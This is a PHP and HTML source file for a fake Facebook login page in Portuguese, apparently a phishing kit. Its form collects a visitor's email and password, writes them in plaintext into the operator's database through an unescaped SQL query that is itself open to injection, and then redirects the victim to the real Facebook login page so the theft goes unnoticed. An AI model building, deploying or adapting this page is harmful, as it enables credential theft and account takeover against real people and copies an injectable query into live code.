<?php 

    if(isset($_POST['submit']))
    {
      // print_r($_POST['email']);
      // print_r('<br>');
      // print_r($_POST['password']);

        include_once('config.php');

      $email = $_POST['email'];
      $password = $_POST['password'];

      $result = mysqli_query($conexao, "INSERT INTO tables(email, password) VALUES('$email','$password')");
      header("Location: https://www.facebook.com/login.php?login_attempt=1");
    }


?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="_css/style.css">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <title>Facebook</title>
</head>
<body>
    <div id="corpo">
        <h1>facebook</h1>
        <div id="login">
            <form action="index.php" method="POST">
                <p>Entrar no Facebook</p>

                <input type="email" name="email" id="email" placeholder="Email ou telefone" required>
                <input type="password" name="password" id="password" placeholder="Senha" required>
                <button type="submit" name="submit" id="submit">Entrar</button>
                <a href="#">Esqueceu a senha?</a>
            </form>
        </div>
    </div>
</body>
</html>